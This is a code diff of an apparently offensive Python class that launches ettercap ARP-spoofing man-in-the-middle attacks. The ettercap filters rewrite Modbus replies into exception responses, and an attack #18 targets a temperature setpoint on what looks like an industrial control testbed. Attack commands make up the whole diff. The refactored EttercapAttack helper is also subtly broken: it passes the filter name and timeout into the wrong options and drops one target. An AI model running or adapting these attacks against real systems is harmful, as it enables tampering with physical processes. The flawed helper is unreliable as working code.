@@ -78,25 +78,29 @@ class attack:
         for AttackNumber in list( self.ThreadDict.keys() ):
             self.StopAttack( AttackNumber )
 
+    def EttercapAttack( self, filter_name, timeout=5  ):
+        command = "ettercap -TQ -s 's{}q' -F {} -M ARP /{}//".format( filter_name, timeout, self.ip )
+        os.system(command)
+
     def Attack8( self ):
         # #8 -- Replace function code with 0x80 and add 0x01 exception code after
-        os.system("ettercap -TQ -s 's(5)q' -F attack8EC1.ef -M ARP /192.168.56.1// /192.168.56.105//")
+        self.EttercapAttack("attack8.ef")
 
     def Attack9( self ):
         # #9 -- Replace function code with 0x80 and add 0x02 exception code after
-        os.system("ettercap -TQ -s 's(5)q' -F attack9EC2.ef -M ARP /192.168.56.1// /192.168.56.105//")
+        self.EttercapAttack("attack9.ef")
 
     def Attack10( self ):
         # #10 -- Replace function code with 0x80 and add 0x03 exception code after
-        os.system("ettercap -TQ -s 's(5)q' -F attack10EC3.ef -M ARP /192.168.56.1// /192.168.56.105//")
+        self.EttercapAttack("attack10.ef")
 
     def Attack11( self ):
         # #11 -- Replace function code with 0x80 and add 0x04 exception code after
-        os.system("ettercap -TQ -s 's(5)q' -F attack11EC4.ef -M ARP /192.168.56.1// /192.168.56.105//")
+        self.EttercapAttack("attack11.ef")
 
     def Attack12( self ):
         # #12 -- Replace function code with 0x80 and add 0x05 exception code after
-        os.system("ettercap -TQ -s 's(5)q' -F attack12EC5.ef -M ARP /192.168.56.1// /192.168.56.105//")
+        self.EttercapAttack("attack12.ef")
 
     def Attack18( self ):
         # #18 -- Set the value of setpoint below 20C
